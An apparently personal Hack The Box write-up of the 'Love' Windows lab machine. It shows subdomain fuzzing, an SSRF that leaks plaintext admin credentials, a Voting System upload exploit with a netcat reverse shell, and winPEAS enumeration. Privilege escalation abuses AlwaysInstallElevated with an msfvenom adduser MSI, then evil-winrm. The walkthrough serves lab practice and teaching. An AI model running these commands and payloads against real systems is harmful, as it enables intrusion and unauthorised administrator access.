# Introduction

[![Armageddon](https://www.hackthebox.eu/storage/avatars/c00774d8d806b82c709c596937a92d14.png)](https://app.hackthebox.eu/machines/344)

| Point | Description |
| :------:| :------: |
| Name | Love |
| OS   | Windows  |
| Difficulty Rating| Easy   |
| Release | 01 May 2021   |
| IP | 10.10.10.239   |
| Owned | 27 May 2021 |

# Short retelling

* Enumeration and find subdomain
* Using SSRF to get more information
* Using exploit for VotingSystem
* Get user.txt
* Exploit vuln in Group Policy
* Install maliciously crafted software
* Get root.txt

# Enumeration

## Nmap

Recon host 10.10.10.239 with Nmap and Add love.htb to /etc/hosts

```
┌──(root💀kali)-[/home/kali]
└─# nmap -sV -p- -sC love.htb           
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-26 01:24 EDT
Nmap scan report for love.htb (10.10.10.239)
Host is up (0.17s latency).
Not shown: 65516 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/ssl      Apache httpd (SSL-only mode)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   FourOhFourRequest, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, SIPOptions, SMBProgNeg, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    Host '10.10.16.9' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
5985/tcp,   open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2021-05-26T06:07:35+00:00; +33m16s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=5/26%Time=60ADDD36%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\
SF:x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")
SF:%r(TLSSessionReq,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x2
SF:0not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r
SF:(Kerberos,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x2
SF:0allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SMBPro
SF:gNeg,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,49
SF:,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x20allowed\x20
SF:to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(FourOhFourRequest,
SF:49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LPDString,49,"E\
SF:0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x20allowed\x20to\x
SF:20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPSearchReq,49,"E\0\
SF:0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x20allowed\x20to\x20
SF:connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPBindReq,49,"E\0\0\x0
SF:1\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x20allowed\x20to\x20conn
SF:ect\x20to\x20this\x20MariaDB\x20server")%r(SIPOptions,49,"E\0\0\x01\xff
SF:j\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x20allowed\x20to\x20connect\x
SF:20to\x20this\x20MariaDB\x20server")%r(LANDesk-RC,49,"E\0\0\x01\xffj\x04
SF:Host\x20'10\.10\.16\.9'\x20is\x20not\x20allowed\x20to\x20connect\x20to\
SF:x20this\x20MariaDB\x20server")%r(TerminalServer,49,"E\0\0\x01\xffj\x04H
SF:ost\x20'10\.10\.16\.9'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x
SF:20this\x20MariaDB\x20server")%r(NCP,49,"E\0\0\x01\xffj\x04Host\x20'10\.
SF:10\.16\.9'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Ma
SF:riaDB\x20server")%r(NotesRPC,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\
SF:.9'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x
SF:20server")%r(JavaRMI,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20i
SF:s\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server
SF:");
Service Info: Hosts: LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h18m16s, deviation: 3h30m02s, median: 33m14s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-25T23:07:22-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-26T06:07:20
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 609.05 seconds
```

Ok, we have 6 http services on 80/tcp, 5000/tcp, 5040/tcp, 5985/tcp, 5986/tcp, 47001/tcp, MySQL server on 3306/tcp and SMB on 445/tcp.

Let's check every htttp service

* http://love.htb/

And we see login form of *Voting System*

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/l1.PNG)

* http://love.htb:5000/

Error 403. We don't have permission to access.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/l2.PNG)

Request to another http services returns 404 error.

Check source code and get no result.

## ffuf

Let's find open directories in http://love.htb/

```
┌──(root💀kali)-[/home/kali/HTB/Love]
└─# ffuf -w /usr/share/SecLists/Discovery/Web-Content/common.txt -u http://love.htb/FUZZ -e php,txt,htm,html,phtml,js,zip,rar,tar -mc 200,301,302                                                                                      1 ⨯

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://love.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/common.txt
 :: Extensions       : php txt htm html phtml js zip rar tar 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302
________________________________________________

ADMIN                   [Status: 301, Size: 329, Words: 22, Lines: 10]
Admin                   [Status: 301, Size: 329, Words: 22, Lines: 10]
Images                  [Status: 301, Size: 330, Words: 22, Lines: 10]
admin                   [Status: 301, Size: 329, Words: 22, Lines: 10]
dist                    [Status: 301, Size: 328, Words: 22, Lines: 10]
images                  [Status: 301, Size: 330, Words: 22, Lines: 10]
includes                [Status: 301, Size: 332, Words: 22, Lines: 10]
index.php               [Status: 200, Size: 4388, Words: 654, Lines: 126]
plugins                 [Status: 301, Size: 331, Words: 22, Lines: 10]
:: Progress: [46820/46820] :: Job [1/1] :: 349 req/sec :: Duration: [0:02:13] :: Errors: 0 ::
```

And we find *Admin page*

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/l3.PNG)

But we don't have creds to access..

### Enum4Linux

Let's enamurate SMB, we could find credentials there...

```
┌──(root💀kali)-[/home/kali/HTB/Love]
└─# enum4linux -A love.htb
Unknown option: A
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri May 28 04:28:01 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... love.htb
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================ 
|    Enumerating Workgroup/Domain on love.htb    |
 ================================================ 
[E] Can't find workgroup/domain


 ======================================== 
|    Nbtstat Information for love.htb    |
 ======================================== 
Looking up status of 10.10.10.239
No reply from 10.10.10.239

 ================================= 
|    Session Check on love.htb    |
 ================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```

And we don't get any result

## smbclient

And let's check anonymous logon in smb

```
┌──(root💀kali)-[/home/kali/HTB/Love]
└─# smbclient -L //love.htb/ -U  '' -N                                                                                                                                                                                                 1 ⨯
session setup failed: NT_STATUS_ACCESS_DENIED
```

!t's doesn't work.

## ffuf

Ok, also we could try to find a subdomain with ffuf

```
┌──(root💀kali)-[/home/kali/HTB/Love]
└─# ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://love.htb/ -H "Host:FUZZ.love.htb" -fw 654

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://love.htb/
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.love.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 654
________________________________________________

staging                 [Status: 200, Size: 5357, Words: 1543, Lines: 192]
:: Progress: [114441/114441] :: Job [1/1] :: 75 req/sec :: Duration: [0:22:58] :: Errors: 0 ::
```

And we get new web-page *http://staging.love.htb/*

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/l4.PNG)


# Explotation

Ok, we seethe web-page "Free File Scanner". Clicking one tab *Demo*.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/l5.PNG)

We can write any url to upload file. Let's upload php-reverse shell

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/l6.PNG)

Ok, it's doesn't work. But we can create requests to any servers... There is [SSRF](https://portswigger.net/web-security/ssrf), which allow make requests from server to local services.

Let's try to make request to local services *http://localhost:5000/*, because we got 403 code before.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/l7.PNG)

Wow! We get web-page with Voting system Administration's credential

```
admin:@LoveIsInTheAir!!!!
```

Let's go to Admin page of love.htb to check it and login. And we have success

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/l8.PNG)

In Google we find exploits  for *voting system php*.

* https://www.exploit-db.com/exploits/49445
* https://packetstormsecurity.com/files/162497/Voting-System-1.0-Shell-Upload.html

Download first python exploit to kali and edit it...

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/l9.PNG)

Run it..

```
┌──(root💀kali)-[/home/kali/HTB/Love]
└─# python3 exploit_vote.py                      
Start a NC listner on the port you choose above and run...
Logged in
Poc sent successfully
```

And we get reverse shell

```
┌──(root💀kali)-[/home/kali/HTB/Love]
└─# nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.29] from love.htb [10.10.10.239] 50749
b374k shell : connected

Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images>whoami
whoami
love\phoebe
```

Getting **user.txt**

```
C:\xampp\htdocs\omrs\images>cd C:\
cd C:\

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\Users

04/13/2021  06:58 AM    <DIR>          .
04/13/2021  06:58 AM    <DIR>          ..
04/12/2021  03:00 PM    <DIR>          Administrator
04/21/2021  07:01 AM    <DIR>          Phoebe
04/12/2021  02:10 PM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   4,015,972,352 bytes free

C:\Users>cd Phoebe
cd Phoebe

C:\Users\Phoebe>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\Users\Phoebe

04/21/2021  07:01 AM    <DIR>          .
04/21/2021  07:01 AM    <DIR>          ..
04/12/2021  03:50 PM    <DIR>          3D Objects
04/12/2021  03:50 PM    <DIR>          Contacts
04/13/2021  03:20 AM    <DIR>          Desktop
04/12/2021  03:50 PM    <DIR>          Documents
04/13/2021  09:55 AM    <DIR>          Downloads
04/12/2021  03:50 PM    <DIR>          Favorites
04/12/2021  03:50 PM    <DIR>          Links
04/12/2021  03:50 PM    <DIR>          Music
04/12/2021  03:52 PM    <DIR>          OneDrive
04/21/2021  07:01 AM    <DIR>          Pictures
04/12/2021  03:50 PM    <DIR>          Saved Games
04/12/2021  03:51 PM    <DIR>          Searches
04/23/2021  03:39 AM    <DIR>          Videos
               0 File(s)              0 bytes
              15 Dir(s)   4,015,972,352 bytes free

C:\Users\Phoebe>cd Desktop
cd Desktop

C:\Users\Phoebe\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\Users\Phoebe\Desktop

04/13/2021  03:20 AM    <DIR>          .
04/13/2021  03:20 AM    <DIR>          ..
05/29/2021  05:33 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   4,015,951,872 bytes free

C:\Users\Phoebe\Desktop>type user.txt
type user.txt
5f9b350b2de0357e07db88999d65027b
```

# Privilege Escalation

Let's download [winPEAS.exe] (https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
to kali and upload to love.htb machine.

```
┌──(root💀kali)-[/home/kali/HTB/Love]
└─# wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe
--2021-05-30 04:28:46--  https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe [following]
--2021-05-30 04:28:47--  https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1678848 (1.6M) [application/octet-stream]
Saving to: ‘winPEASany.exe’

winPEASany.exe                             100%[=======================================================================================>]   1.60M  2.44MB/s    in 0.7s    

2021-05-30 04:28:48 (2.44 MB/s) - ‘winPEASany.exe’ saved [1678848/1678848]
```

Upload it to love.htb

```
C:\Users\Phoebe\Desktop>curl
curl
curl: try 'curl --help' for more information

C:\Users\Phoebe\Desktop>curl -O http://10.10.14.29:8000/winPEASany.exe
curl -O http://10.10.14.29:8000/winPEASany.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 1639k  100 1639k    0     0   819k      0  0:00:02  0:00:02 --:--:--  794k

C:\Users\Phoebe\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\Users\Phoebe\Desktop

05/30/2021  02:03 AM    <DIR>          .
05/30/2021  02:03 AM    <DIR>          ..
05/29/2021  05:33 PM                34 user.txt
05/30/2021  02:03 AM         1,678,848 winPEASany.exe
               2 File(s)      1,678,882 bytes
               2 Dir(s)   4,013,727,744 bytes free
```

And run winPEAS

```
C:\Users\Phoebe\Desktop>winPEASany.exe >> winpeas.txt
winPEASany.exe >> winpeas.txt

C:\Users\Phoebe\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\Users\Phoebe\Desktop

05/30/2021  02:05 AM    <DIR>          .
05/30/2021  02:05 AM    <DIR>          ..
05/29/2021  05:33 PM                34 user.txt
05/30/2021  02:05 AM           145,679 winpeas.txt
05/30/2021  02:03 AM         1,678,848 winPEASany.exe
               3 File(s)      1,824,561 bytes
               2 Dir(s)   4,013,088,768 bytes free
```

Copy winPEAS.txt to images and download to kali to read report

```
C:\Users\Phoebe\Desktop>copy winpeas.txt C:\xampp\htdocs\omrs\images
copy winpeas.txt C:\xampp\htdocs\omrs\images
        1 file(s) copied.

C:\Users\Phoebe\Desktop>cd C:\xampp\htdocs\omrs\images
cd C:\xampp\htdocs\omrs\images

C:\xampp\htdocs\omrs\images>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\xampp\htdocs\omrs\images

05/30/2021  02:08 AM    <DIR>          .
05/30/2021  02:08 AM    <DIR>          ..
05/30/2021  02:06 AM             5,632 D3fa1t_shell.exe
05/18/2018  08:10 AM             4,240 facebook-profile-image.jpeg
04/12/2021  03:53 PM                 0 index.html.txt
01/27/2021  12:08 AM               844 index.jpeg
08/24/2017  04:00 AM            26,644 profile.jpg
05/30/2021  02:06 AM             6,491 shell.php
05/30/2021  02:05 AM           145,679 winpeas.txt
               7 File(s)        189,530 bytes
               2 Dir(s)   4,013,129,728 bytes free
```

Download it from http://love/htb/images/

```
┌──(root💀kali)-[/home/kali/HTB/Love]
└─# wget http://love.htb/images/winpeas.txt                                                                                                     
--2021-05-30 04:37:02--  http://love.htb/images/winpeas.txt
Resolving love.htb (love.htb)... 10.10.10.239
Connecting to love.htb (love.htb)|10.10.10.239|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 145679 (142K) [text/plain]
Saving to: ‘winpeas.txt’

winpeas.txt                                100%[=======================================================================================>] 142.26K   421KB/s    in 0.3s    

2021-05-30 04:37:03 (421 KB/s) - ‘winpeas.txt’ saved [145679/145679]

                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Love]
└─# ls
exploit_vote.py  pasha.php  winPEASany.exe  winpeas.txt
```

In the report we find interesting info

```
  [+] Checking AlwaysInstallElevated
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

It means, that if these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) *.msi files as NT AUTHORITY\SYSTEM.

* https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
* https://github.com/RackunSec/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Windows/always-install-elevated.md
* https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path
* 

We can create payload with msfvenom

```
msf6 > msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi
[*] exec: msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 284 bytes
Final size of msi file: 159744 bytes
Saved as: alwe.msi
msf6 > exit
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Love]
└─# ls
alwe.msi  exploit_vote.py  pasha.php  winPEASany.exe  winpeas.txt
```

Upload payload to love.htb

```
C:\Users\Phoebe\Music>curl -O http://10.10.14.29:8000/alwe.msi
curl -O http://10.10.14.29:8000/alwe.msi
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  156k  100  156k    0     0   156k      0  0:00:01 --:--:--  0:00:01  269k

C:\Users\Phoebe\Music>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\Users\Phoebe\Music

05/30/2021  02:19 AM    <DIR>          .
05/30/2021  02:19 AM    <DIR>          ..
05/30/2021  02:19 AM           159,744 alwe.msi
               1 File(s)        159,744 bytes
               2 Dir(s)   4,012,601,344 bytes free
```

And Run it

```
C:\Users\Phoebe\Music>net user
net user

User accounts for \\LOVE

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
Phoebe                   WDAGUtilityAccount       
The command completed successfully.

:\Users\Phoebe\Music>msiexec /quiet /qn /i alwe.msi            
msiexec /quiet /qn /i alwe.msi

C:\Users\Phoebe\Music>net user
net user

User accounts for \\LOVE

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
Phoebe                   rottenadmin              WDAGUtilityAccount       
The command completed successfully.
```

And we create net user *rottenadmin* with system's privilages

```
C:\Users\Phoebe\Music>net user rottenadmin
net user rottenadmin
User name                    rottenadmin
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/30/2021 2:31:16 AM
Password expires             7/11/2021 2:31:16 AM
Password changeable          5/30/2021 2:31:16 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users                
Global Group memberships     *None                 
The command completed successfully.
```

Let's use [evil-winrm](https://github.com/Hackplayers/evil-winrm) to connect host

```
──(root💀kali)-[/home/kali/HTB/Love]
└─# evil-winrm -i love.htb -u rottenadmin -p 'P@ssword123!'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\rottenadmin\Documents> whoami
love\rottenadmin
```

And we get **root.txt**

```
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         4/12/2021   3:00 PM                Administrator
d-----         4/21/2021   7:01 AM                Phoebe
d-r---         4/12/2021   2:10 PM                Public
d-----         5/30/2021   2:37 AM                rottenadmin


*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         4/12/2021   2:55 PM                3D Objects
d-r---         4/12/2021   2:55 PM                Contacts
d-r---         4/13/2021   3:20 AM                Desktop
d-r---         4/12/2021   2:55 PM                Documents
d-r---         4/13/2021   3:18 AM                Downloads
d-r---         4/12/2021   2:55 PM                Favorites
d-r---         4/12/2021   2:55 PM                Links
d-r---         4/12/2021   2:55 PM                Music
d-r---         4/13/2021   3:16 AM                OneDrive
d-r---         4/12/2021   2:57 PM                Pictures
d-r---         4/12/2021   2:55 PM                Saved Games
d-r---         4/12/2021   2:57 PM                Searches
d-r---         4/12/2021   2:55 PM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         5/29/2021   5:33 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
c7d28291043b3a8af835c2e5b7cfdb34
```

# Resources

1. https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html
2. 

